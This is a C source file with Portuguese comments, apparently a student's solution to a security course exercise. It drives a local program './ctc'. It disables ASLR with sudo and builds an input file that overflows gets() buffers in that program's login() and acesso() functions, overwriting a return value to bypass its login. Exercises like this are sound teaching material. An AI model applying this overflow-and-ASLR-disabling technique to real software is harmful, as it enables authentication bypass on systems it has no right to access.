#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFF_SIZE 60 // DEFINA O TAMANHO DO BUFFER AQUI
#define USER_SIZE 3 // DEFINE O TAMANHO DO USUARIO
#define PASS_SIZE 34 // DEFINE O TAMANHO DA SENHA

void execute() {
    system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
    system("./ctc");
    system("sudo echo 2 > /proc/sys/kernel/randomize_va_space");
}

void debug() {
    system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
    system("gdb ./ctc");
    system("sudo echo 2 > /proc/sys/kernel/randomize_va_space");
}

void crack() {
    FILE *f = fopen("./teste.in", "w+");
    char buff[BUFF_SIZE];
    char user[USER_SIZE] = "SB\n";
    char pass[PASS_SIZE] = "SB";
    int ret_value = 3;
    //IMPLEMENTE A ENTRADA PARA ALCANÇAR OS OBJETIVOS DO TRABALHO AQUI (USAR A ENTRADA PADRÃO)
    fwrite(user, 1, USER_SIZE, f); // nao precisa quebrar o buffer de usuario
    fwrite(pass, 1, PASS_SIZE, f); // quebra o buffer de gets() em login()
    fwrite("\n", 1, 1, f);
    fwrite(buff, 1, BUFF_SIZE, f); // quebra o buffer de gets() em acesso()
    fwrite(&ret_value, sizeof(ret_value), 1, f); // altera o valor de ret_value para 3 
    fclose(f);

    system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
    system("./ctc < teste.in");
    system("sudo echo 2 > /proc/sys/kernel/randomize_va_space");
}

int main(int argc, char **argv) {

    if (argc == 2){ 	
        if (!strcmp(argv[1], "1")){
            execute(); 
            return 0;
        } 
        if (!strcmp(argv[1], "2")){
            debug();
            return 0;
        }
        if (!strcmp(argv[1], "3")){
            crack();
            return 0;
        }
    }

    printf("=========== HELP ===========\n");
    printf("EXECUTE AS SUPER USER!!\n");
    printf("./cracker [1|2|3]\n");
    printf("1 -> Execute\n");
    printf("2 -> Debug\n");
    printf("3 -> Crack\n");
    printf("============================\n");
    return 1;
}
